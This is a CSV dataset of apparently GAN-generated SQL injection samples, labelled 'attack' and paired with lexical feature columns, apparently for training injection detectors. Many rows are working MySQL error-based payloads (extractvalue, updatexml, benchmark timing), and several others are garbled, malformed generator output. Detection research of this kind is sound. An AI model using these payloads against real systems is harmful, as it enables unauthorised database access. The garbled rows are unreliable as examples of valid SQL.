label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,1%jk'  =  'xpphf,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1210,16.0,11.0,3.25,7.0,1.0,4.0,4.0,0.4375,0.0625,0.25,0.25,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1211,155.0,28.0,3.762717659287879,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1212,164.0,27.0,3.607143482229841,39.0,35.0,65.0,25.0,0.23780487804878048,0.21341463414634146,0.39634146341463417,0.1524390243902439,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%jbj",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1213,160.0,29.0,3.753830152677876,39.0,39.0,59.0,23.0,0.24375,0.24375,0.36875,0.14375,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,2.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1214,155.0,28.0,3.762717659287879,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1215,154.0,27.0,3.7603303976738283,36.0,39.0,55.0,24.0,0.23376623376623376,0.2532467532467532,0.35714285714285715,0.15584415584415584,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1216,155.0,28.0,3.7468183467284586,39.0,35.0,57.0,24.0,0.25161290322580643,0.22580645161290322,0.36774193548387096,0.15483870967741936,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,3.0,0.0,5.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'orkhuh' like 'kunn",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1217,163.0,29.0,3.9683038879276693,50.0,39.0,53.0,21.0,0.3067484662576687,0.2392638036809816,0.32515337423312884,0.12883435582822086,4.0,0.0,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack," AND else 0 from d ual  )  elydue  )  elt  (  elt  (  2917  =  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  5000000(  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  1808  =  1808,1   from d 0 from a  (  1724  (  elt  elt  (  3393  =    (  (  (  0x5c,  (  (  (  select   (  elt  (  (  (  elt",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1218,297.0,32.0,3.600814493921283,79.0,64.0,117.0,37.0,0.265993265993266,0.21548821548821548,0.3939393939393939,0.12457912457912458,0.0,0.0,0.0,0.0,0.0,3.0,0.0,27.0,0.0,0.0,7.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1219,155.0,28.0,3.762717659287879,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1220,159.0,32.0,3.8126896484388566,52.0,24.0,60.0,23.0,0.3270440251572327,0.1509433962264151,0.37735849056603776,0.14465408805031446,2.0,2.0,0.0,0.0,0.0,1.0,0.0,12.0,2.0,0.0,4.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1221,164.0,27.0,3.6600619679006208,36.0,39.0,63.0,26.0,0.21951219512195122,0.23780487804878048,0.38414634146341464,0.15853658536585366,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1   )    (  select,0x7171706a71(  (  (  (  select   (   (  (  8375  =  (  1297,1   )    (  extractvalue  (  1297,concat  (  (  =  (  (  (  0x2e,md5  (  (  benchmark  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  7982  =  (  (  3393  (  (  1808  =  (  1808,concat  (  (  3393  (  (  3393  =  (  (  3393,m,  (  5000000,md5  (  (  (  1808  =  3393",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1222,350.0,31.0,3.519813898031103,67.0,83.0,143.0,57.0,0.19142857142857142,0.23714285714285716,0.4085714285714286,0.16285714285714287,0.0,0.0,0.0,0.0,0.0,6.0,0.0,41.0,0.0,0.0,10.0,6.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1223,165.0,27.0,3.674404995396533,37.0,39.0,63.0,26.0,0.22424242424242424,0.23636363636363636,0.38181818181818183,0.15757575757575756,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%R' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and '"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""Uifkkj--",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1224,300.0,38.0,3.9592788659407283,83.0,73.0,104.0,40.0,0.27666666666666667,0.24333333333333335,0.3466666666666667,0.13333333333333333,2.0,2.0,2.0,0.0,0.0,2.0,0.0,20.0,1.0,0.0,11.0,4.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1%""   )    AND and extractvalue  (  (  (  (  3393,concat  (  (  0x2e,concat  (  (  0x5c,0x7171706a71,  (  (  5000000,m(  (  (  5000000,md5  (  =  (  9788,1   (  extractvalue  (  9627,md5  (  =  (  1808,concat  (  (  (  0x4b774c75   (  4415  (  (  (  3393  =  (  3393,md5  =  (  2917,concat  (  (  (  3393,  (  (  (  5000000,md5  (  7982  (  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1225,345.0,34.0,3.7254716699825186,72.0,88.0,127.0,58.0,0.20869565217391303,0.25507246376811593,0.3681159420289855,0.1681159420289855,0.0,1.0,0.0,0.0,0.0,4.0,0.0,39.0,1.0,0.0,13.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1226,154.0,28.0,3.7863044236478545,36.0,39.0,55.0,24.0,0.23376623376623376,0.2532467532467532,0.35714285714285715,0.15584415584415584,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1227,155.0,28.0,3.762717659287879,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1%pk,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1228,4.0,4.0,2.0,2.0,1.0,0.0,1.0,0.5,0.25,0.0,0.25,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1229,155.0,29.0,3.788524110900782,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1230,154.0,28.0,3.7863044236478545,36.0,39.0,55.0,24.0,0.23376623376623376,0.2532467532467532,0.35714285714285715,0.15584415584415584,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""   )    AND procedure analyse  (  elt  case  )    =  (  1808,1   )    (  extractvalue  (  (  2917,concat  (  (  0x5c,0x7171706a71,  (  t  (  (  5000000,md5  (  (  (  (  1808  =  1   (  8375  (  select   (  5322  (  ut  elt  (  7982  =  (  (  0x5c,  (  benchmark  (  (  benchmark  (  (  5000000(  (  1808,1   (  updatexml  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1231,329.0,38.0,3.731246108217114,91.0,61.0,131.0,46.0,0.2765957446808511,0.18541033434650456,0.3981762917933131,0.1398176291793313,0.0,1.0,0.0,0.0,0.0,3.0,0.0,34.0,1.0,0.0,7.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1232,155.0,29.0,3.788524110900782,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""   )    )     extractvalue  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  7982  =  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  9788  =  (  0x2e,0x7171706a71,0  (  (  (  benchmark  (  9255,1    ,8666  UST  (  Ut   )    (  select   (  case 0 from dua  elt  (  el  (  1808  =  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1233,353.0,36.0,3.702045542889162,97.0,72.0,137.0,47.0,0.2747875354107649,0.20396600566572237,0.3881019830028329,0.13314447592067988,0.0,1.0,0.0,0.0,0.0,3.0,0.0,32.0,1.0,0.0,10.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1234,154.0,27.0,3.7064777642505358,39.0,35.0,57.0,23.0,0.2532467532467532,0.22727272727272727,0.37012987012987014,0.14935064935064934,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1 where updatexml  (  (  (  (  (  (  7706  (  (   (  3576  (  (   (  (   (  4774  (  3863  =  ut  (  eltal  )  7982  =  6212  (  5777  =  (  2518  )   (  (  )  elt  (  7982  =  (  (  select   (  elt  (  elt  (  1297  =  (  3393,  (  (  select   (  elt  (  1808  =  (  1808,,select   (  2501,  (  (  0x2e,8666  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1235,310.0,29.0,3.217920599893819,53.0,63.0,145.0,49.0,0.17096774193548386,0.2032258064516129,0.46774193548387094,0.15806451612903225,0.0,0.0,0.0,0.0,0.0,6.0,0.0,38.0,0.0,0.0,5.0,6.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""   )    )     extractvalue  (  }1808,concat  (  (  0x2e,concat  (  =  (  (  0x2e,0x7171706a71,  (  0x2e,0x7171706a71,  (  (  select   (  5000000,md5  (  8862  (  0x2e,0x7171706a71,  (  5000000(  (  (  0x4b774c75   (  (  elt  (  elt  (  1297  =  5603  (  (  0x5c,  (  select   (  el  9788  =  (  (  1808,concat  (  =  (  0x5c,  (  (  select   (  elt  (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1236,364.0,33.0,3.629199050320608,85.0,89.0,136.0,54.0,0.23351648351648352,0.2445054945054945,0.37362637362637363,0.14835164835164835,0.0,1.0,0.0,0.0,0.0,4.0,0.0,35.0,1.0,0.0,12.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1237,165.0,28.0,3.6986474196389576,37.0,39.0,63.0,26.0,0.22424242424242424,0.23636363636363636,0.38181818181818183,0.15757575757575756,2.0,2.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,6.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1238,155.0,29.0,3.788524110900782,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
